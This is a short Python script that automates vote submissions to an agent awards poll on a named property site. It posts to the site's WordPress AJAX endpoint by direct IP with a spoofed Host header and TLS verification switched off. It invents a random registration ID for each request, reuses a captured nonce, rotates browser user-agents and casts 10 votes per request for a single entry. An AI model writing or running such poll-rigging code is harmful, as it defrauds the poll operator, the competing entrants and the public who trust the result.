#!/usr/bin/env python3
import json
import random
import ssl
import sys
import urllib.request
import urllib.parse

ORIGIN = "https://34.87.175.229"
HOST = "www.agentofferings.propertyguru.com.sg"
POST_ID = "24454"
NONCE = "3e04eea04c"
VOTES = 10
TRIES = 5

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def cea():
    return f"R{random.randint(100000,999999)}{chr(random.randint(65,90))}"

def vote():
    c = cea()
    data = urllib.parse.urlencode({
        "action": "pg_vote_submit",
        "mobile": c,
        "votes": json.dumps({POST_ID: VOTES}),
        "nonce": NONCE,
    }).encode()
    req = urllib.request.Request(
        f"{ORIGIN}/wp-admin/admin-ajax.php",
        data=data,
        headers={
            "Host": HOST,
            "User-Agent": f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(130,148)}.0.0.0 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": f"https://{HOST}/agent-choice-awards/vote/",
            "Origin": f"https://{HOST}",
        },
    )
    try:
        r = urllib.request.urlopen(req, timeout=30, context=ctx)
        body = r.read().decode()
        ok = "success" in body
        print(f"cea={c} st={r.status} ok={ok}")
        return ok
    except Exception as e:
        print(f"cea={c} err={e}")
        return False

if __name__ == "__main__":
    n = int(sys.argv[1]) if len(sys.argv) > 1 else TRIES
    ok = sum(1 for _ in range(n) if vote())
    print(f"DONE {ok}/{n} = {ok * VOTES}v")
